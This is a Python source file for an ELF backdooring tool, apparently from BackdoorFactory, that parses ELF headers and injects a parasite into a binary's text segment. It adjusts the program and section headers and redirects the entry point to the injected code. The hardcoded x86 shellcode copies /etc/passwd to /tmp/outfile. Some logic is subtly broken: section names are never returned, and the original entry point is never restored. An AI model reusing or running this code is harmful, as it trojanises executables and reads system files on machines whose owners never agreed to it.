#!/usr/bin/env python
import struct
import os
import sys
import shutil
import binascii

class elf():
    """
    ELF data format class for BackdoorFactory.
    We don't need the ENTIRE format.
    """

    #setting linux header infomation
    e_ident = {"EI_MAG": "\x7f" + "ELF",
                "EI_CLASS": {0x01: "x86",
                             0x02: "x64"
                            },
                "EI_DATA_little": 0x01,
                "EI_DATA_big": 0x02,
                "EI_VERSION": 0x01,
                "EI_OSABI": {0x00: "System V",
                             0x01: "HP-UX",
                             0x02: "NetBSD",
                             0x03: "Linux",
                             0x06: "Solaris",
                             0x07: "AIX",
                             0x08: "IRIX",
                             0x09: "FreeBSD",
                             0x0C: "OpenBSD"
                             },
                "EI_ABIVERSION": 0x00,
                "EI_PAD": 0x07
                }

    e_type = {0x01: "relocatable",
              0x02: "executable",
              0x03: "shared",
              0x04: "core"
             }

    e_machine = {0x02: "SPARC",
                 0x03: "x86",
                 0x14: "PowerPC",
                 0x28: "ARM",
                 0x32: "IA-64",
                 0x3E: "x86-64",
                 0xB7: "AArch64"
                }
    e_version = 0x01
#end elf class

class elfbin():
    """
    This is the class handler for the elf binary format
    """
    def __init__(self, FILE, OUTPUT,SHELLCODE):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.bin_file = open(self.FILE, "r+b")
        self.SHELLCODE = SHELLCODE
    def get_section_name(self, section_offset):
        '''
        Get section names
        '''
        self.bin_file.seek(self.sec_hdr[self.e_shstrndx]['sh_offset']+section_offset,0)
        name = ''
        j = ''
        while True:
            j = self.bin_file.read(1)
            if hex(ord(j)) == '0x0':
                break
            else:
                name += j
        #print "name:", name


    def set_section_name(self):
        '''
        Set the section names
        '''
        #print "self.s_shstrndx", self.e_shstrndx
         #how to find name section specifically
        for i in range(0, self.e_shstrndx+1):
            self.sec_hdr[i]['name'] = self.get_section_name(self.sec_hdr[i]['sh_name'])
            if self.sec_hdr[i]['name'] == ".text":
                #print "Found text section"
                self.text_section =  i


    def gather_file_info(self):
        '''
        Gather info about the binary
        '''
        print "[*] Gathering file info"
        bin = self.bin_file
        bin.seek(0)
        EI_MAG = bin.read(4)
        self.EI_CLASS = struct.unpack("<B", bin.read(1))[0]
        self.EI_DATA = struct.unpack("<B", bin.read(1))[0]
        if self.EI_DATA == 0x01:
            #little endian
            self.endian = "<"
        else:
            #big self.endian
            self.endian = ">"
        self.EI_VERSION = bin.read(1)
        self.EI_OSABI = bin.read(1)
        self.EI_ABIVERSION = bin.read(1)
        self.EI_PAD = struct.unpack("<BBBBBBB", bin.read(7))[0]
        self.e_type = struct.unpack("<H", bin.read(2))[0]
        self.e_machine = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_version = struct.unpack(self.endian + "I", bin.read(4))[0]
        #print "EI_Class", self.EI_CLASS
        if self.EI_CLASS == 0x01:
            #print "32 bit D:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "I", bin.read(4))[0]
            #print hex(self.e_entry)
            self.e_phoff = struct.unpack(self.endian + "I", bin.read(4))[0]
            self.e_shoff = struct.unpack(self.endian + "I", bin.read(4))[0]
        else:
            #print "64 bit B:"
            self.e_entryLocOnDisk = bin.tell()
            self.e_entry = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_phoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
            self.e_shoff = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #print hex(self.e_entry)
        #print "e_phoff", self.e_phoff
        #print "e_shoff", self.e_shoff
        self.VrtStrtngPnt = self.e_entry
        self.e_flags = struct.unpack(self.endian + "I", bin.read(4))[0]
        self.e_ehsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_phnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shentsize = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shnum = struct.unpack(self.endian + "H", bin.read(2))[0]
        self.e_shstrndx = struct.unpack(self.endian + "H", bin.read(2))[0]
        #self.e_version'] = struct.e_entry
        #section tables
        bin.seek(self.e_phoff,0)
        #header tables
        if self.e_shnum == 0:
            print "more than 0xFF00 sections, wtf?"
            #print "real number of section header table entries"
            #print "in sh_size."
            self.real_num_sections = self.sh_size
        else:
            #print "less than 0xFF00 sections, yay"
            self.real_num_sections = self.e_shnum
        #print "real_num_sections", self.real_num_sections

        bin.seek(self.e_phoff,0)
        self.prog_hdr = {}
        #print 'e_phnum', self.e_phnum
        for i in range(self.e_phnum):
            #print "i check e_phnum", i
            self.prog_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.prog_hdr[i]['p_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.prog_hdr[i]['p_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_vaddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_paddr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_filesz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_memsz'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.prog_hdr[i]['p_align'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
            if self.prog_hdr[i]['p_type'] == 0x1 and self.prog_hdr[i]['p_vaddr'] < self.e_entry:
                self.offset_addr = self.prog_hdr[i]['p_vaddr']
                self.LocOfEntryinCode = self.e_entry - self.offset_addr
                #print "found the entry offset"

        bin.seek(self.e_shoff, 0)
        self.sec_hdr = {}
        for i in range(self.e_shnum):
            self.sec_hdr[i] = {}
            if self.EI_CLASS == 0x01:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                #print self.sec_hdr[i]['sh_name']
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "I", bin.read(4))[0]
            else:
                self.sec_hdr[i]['sh_name'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_type'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_flags'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_addr'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_offset'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_size'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_link'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_info'] = struct.unpack(self.endian + "I", bin.read(4))[0]
                self.sec_hdr[i]['sh_addralign'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
                self.sec_hdr[i]['sh_entsize'] = struct.unpack(self.endian + "Q", bin.read(8))[0]
        #bin.seek(self.sec_hdr'][self.e_shstrndx']]['sh_offset'], 0)
        self.set_section_name()
        if self.e_type != 0x2:
            print "[!] Only supporting executable elf e_types, things may get wierd."

    def patch_elf(self):
        '''
        Circa 1998: http://vxheavens.com/lib/vsc01.html  <--Thanks to elfmaster
        6. Increase p_shoff by PAGE_SIZE in the ELF header
        7. Patch the insertion code (parasite) to jump to the entry point (original)
        1. Locate the text segment program header
            -Modify the entry point of the ELF header to point to the new code (p_vaddr + p_filesz)
            -Increase p_filesz by account for the new code (parasite)
            -Increase p_memsz to account for the new code (parasite)
        2. For each phdr who's segment is after the insertion (text segment)
            -increase p_offset by PAGE_SIZE
        3. For the last shdr in the text segment
            -increase sh_len by the parasite length
        4. For each shdr who's section resides after the insertion
            -Increase sh_offset by PAGE_SIZE
        5. Physically insert the new code (parasite) and pad to PAGE_SIZE,
            into the file - text segment p_offset + p_filesz (original)
        '''
        shutil.copy2(self.FILE, self.OUTPUT)
        self.gather_file_info()
        print "[*] Patching Binary"
        self.bin_file = open(self.OUTPUT, "r+b")

        shellcode = "\x31\xc0\xb0\x05\x31\xc9\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x8d\x5c\x24\x01\xcd\x80\x89\xc3\xb0\x03\x89\xe7\x89\xf9\x66\x6a\xff\x5a\xcd\x80\x89\xc6\x6a\x05\x58\x31\xc9\x51\x68\x66\x69\x6c\x65\x68\x2f\x6f\x75\x74\x68\x2f\x74\x6d\x70\x89\xe3\xb1\x42\x66\x68\xa4\x01\x5a\xcd\x80\x89\xc3\x6a\x04\x58\x89\xf9\x89\xf2\xcd\x80\x31\xc0\x31\xdb\xb0\x01\xb3\x05\xcd\x80"
        #print >>sys.stderr,shellcode+"\n"
        #shellcode = self.str2hex(self.SHELLCODE)
        #print >>sys.stderr,shellcode+"\n"
        newBuffer = len(shellcode)
        self.bin_file.seek(24, 0)

        sh_addr = 0x0
        offsetHold = 0x0
        sizeOfSegment = 0x0
        shellcode_vaddr = 0x0
        headerTracker = 0x0
        PAGE_SIZE = 4096
        #find range of the first PT_LOAD section
        for header, values in self.prog_hdr.iteritems():
            #print 'program header', header, values
            if values['p_flags'] == 0x5 and values['p_type'] == 0x1:
                #print "Found text segment"
                shellcode_vaddr = values['p_vaddr'] + values['p_filesz']
                beginOfSegment = values['p_vaddr']
                oldentry = self.e_entry
                sizeOfNewSegment = values['p_memsz'] + newBuffer
                LOCofNewSegment = values['p_filesz'] + newBuffer
                headerTracker = header
                newOffset = values['p_offset'] + values['p_filesz']

        #SPLIT THE FILE
        self.bin_file.seek(0)
        file_1st_part = self.bin_file.read(newOffset)
        #print file_1st_part.encode('hex')
        newSectionOffset = self.bin_file.tell()
        file_2nd_part = self.bin_file.read()

        self.bin_file.close()
        #print "Reopen file for adjustments"
        self.bin_file = open(self.OUTPUT, "w+b")
        self.bin_file.write(file_1st_part)
        self.bin_file.write(shellcode)
        self.bin_file.write("\x00" * (PAGE_SIZE - len(shellcode)))
        self.bin_file.write(file_2nd_part)
        if self.EI_CLASS == 0x01:
            #32 bit FILE
            #update section header table
            self.bin_file.seek(24, 0)
            self.bin_file.seek(8, 1)
            self.bin_file.write(struct.pack(self.endian + "I", self.e_shoff + PAGE_SIZE))
            self.bin_file.seek(self.e_shoff + PAGE_SIZE, 0)
            for i in range(self.e_shnum):
                #print "i", i, self.sec_hdr[i]['sh_offset'], newOffset
                if self.sec_hdr[i]['sh_offset'] >= newOffset:
                    #print "Adding page size"
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_offset'] + PAGE_SIZE))
                    self.bin_file.seek(20, 1)
                elif self.sec_hdr[i]['sh_size'] + self.sec_hdr[i]['sh_addr'] == shellcode_vaddr:
                    #print "adding newBuffer size"
                    self.bin_file.seek(20, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.sec_hdr[i]['sh_size'] + newBuffer))
                    self.bin_file.seek(16, 1)
                else:
                    self.bin_file.seek(40,1)
            #update the pointer to the section header table
            after_textSegment = False
            self.bin_file.seek(self.e_phoff,0)
            for i in range(self.e_phnum):
                #print "header range i", i
                #print "shellcode_vaddr", hex(self.prog_hdr[i]['p_vaddr']), hex(shellcode_vaddr)
                if i == headerTracker:
                    #print "Found Text Segment again"
                    after_textSegment = True
                    self.bin_file.seek(16, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_filesz'] + newBuffer))
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_memsz'] + newBuffer))
                    self.bin_file.seek(8, 1)
                elif after_textSegment is True:
                    #print "Increasing headers after the addition"
                    self.bin_file.seek(4, 1)
                    self.bin_file.write(struct.pack(self.endian + "I", self.prog_hdr[i]['p_offset'] + PAGE_SIZE))
                    self.bin_file.seek(24, 1)
                else:
                    self.bin_file.seek(32,1)

            self.bin_file.seek(self.e_entryLocOnDisk, 0)
            self.bin_file.write(struct.pack(self.endian + "I", shellcode_vaddr))

        self.bin_file.close()
        print "[!] Patching Complete"
        return True

# END elfbin clas
